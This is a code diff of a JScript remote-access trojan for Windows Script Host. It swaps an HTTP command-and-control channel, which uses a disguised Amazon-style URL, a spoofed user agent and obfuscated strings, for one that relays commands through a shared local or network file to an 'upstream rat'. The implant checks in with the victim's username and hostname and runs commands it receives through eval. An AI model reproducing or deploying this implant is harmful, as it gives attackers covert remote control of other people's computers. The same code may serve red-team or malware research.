@@ -1,15 +1,6 @@
 //Define variables
-var ipp  = "172.16.71.1"
-var p0rt= "8080"
-var uri = "/s/ref=nb_sb_noss_1/167-3294888-0262949/field-keywords=books";
-var proto = "ht"+"tp"+":/"+"/"
-var home = proto+ipp+":"+p0rt+uri
+var home = 'C:\\users\\localadmin\\desktop\\bridge.txt' // UNC or local path. Send and receive data through this file
 var sleepytime = 3000 //in milliseconds
-
-var useragent = "Mozilla/5.0 (compatible, MSIE 11, Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko";
-var xFrameOptions = "SAMEORIGIN"
-var contentEncoding = "gzip"
-var contentType = "text/xml"
 
 var runner = new ActiveXObject("WScript.Shell")
 var temp = runner.ExpandEnvironmentStrings("%TE" +"MP%");
@@ -39,31 +30,22 @@ if(fso.FileExists(selfpath))
   catch (e) {};
 }
 
-//Helper functions
-function post(home, response) {
-  var res;
-  try
-  {
-    var WinHttpReq = new ActiveXObject( "WinHttp.WinHttpRequest.5.1" );
-    WinHttpReq.Open("POST", home, false);
-    //Set HTTP Headers
-    WinHttpReq.setRequestHeader("User-Agent", useragent);
-    WinHttpReq.setRequestHeader("X-Frame-Options", xFrameOptions);
-    WinHttpReq.setRequestHeader("Content-Type", contentType);
-    //Send the HTTP request.
-    WinHttpReq.Send(response);
-    //Wait for the entire response.
-    WinHttpReq.WaitForResponse();
-    //Retrieve the response text.
-    res = WinHttpReq.ResponseText;
+function smb_post(home, response) {
+  var fdr = fso.OpenTextFile(home)
+  var updata = fdr.ReadAll()
+  fdr.close()
+
+  if(updata !== checkin+"\r\n") { // Windows adds a \r\n at the end of file reads
+    var fdw = fso.OpenTextFile(home, 2) // mode 2 = write
+//    WScript.Echo("smb: Downstream Recieved: " + updata)
+//    WScript.Echo("smb: Downstream Sending: " + response)
+    fdw.WriteLine(response)
+    fdw.close()
+    return updata.split("\r")[0]
   }
-  catch (objError)
-  {
-    res = objError + "\n"
-    res += "WinHTTP returned error: " + (objError.number & 0xFFFF).toString() + "\n\n";
-    res += objError.description;
+  else {
+    return false
   }
-  return res;
 }
 
 function writebinfile(filename, content) {
@@ -134,13 +116,28 @@ function b64d(data, type) {
 
 //Main
 var checkin = '{ "p":[ {"type": "'+type+'","id": '+id+',"un": "'+un+'","hn": "'+hn+'"} ] }'; //initial checkin
+if((fso.FileExists(home))) {
+  fso.DeleteFile(home)
+}
+var fd = fso.CreateTextFile(home)
+fd.close()
+var fdw = fso.OpenTextFile(home, 2) // mode 2 = write
+fdw.WriteLine(checkin) // write checkin for the first time
+fdw.close()
+
 while(true)
 {
-  try
-  {
+  //try
+  //{
     var retval = ""
-    var serverMsg = post(home, checkin);
-    var jsondata = "{" + (serverMsg.split("{").slice(1)).join("{").split("\n")[0] // pull out json from http msg
+    var recv_package = false
+    //WScript.Echo("smb: sending checkin: "+checkin)
+    var jsondata = smb_post(home, checkin);
+    //WScript.Echo("smb: got jsondata frm srv: "+jsondata)
+    if(!jsondata) { // if no message from upstream rat, just wait and try again
+      WScript.Sleep(sleepytime)
+      continue
+    }
     // Convert json string to json object
     eval("jsObject="+jsondata);
     checkin = '{ "p":[ ' // start building json response string
@@ -148,11 +145,7 @@ while(true)
     // Supports running extra functions once per loop ... right before checking for cmnd
     if(runextra) {
       for(var i in extrafunc) {
-        try {
-          eval(extrafunc[i])
-        }
-        catch (e) {
-        }
+        eval(extrafunc[i])
       }
     }
 
@@ -160,6 +153,7 @@ while(true)
     var packages = jsObject.p
     for(var p in packages) {
       if(packages[p].id == id) { // if this is our package (id = our id)
+        recv_package = true
         if(packages[p].cmnd) {
           var rettype = "retval"
           var cmnd = packages[p].cmnd
@@ -264,10 +258,13 @@ while(true)
         }
       }
     }
-  }
-  catch (e) {
-    WScript.Sleep(sleepytime);
-  }
+    if(!recv_package) {
+      checkin += '{"type": "'+type+'", "id": '+id+',"un":"'+un+'","hn":"'+hn+'"} ] }';
+    }
+  //}
+  //catch (e) {
+  //  WScript.Sleep(sleepytime);
+  //}
   WScript.Sleep(sleepytime);
 }
 
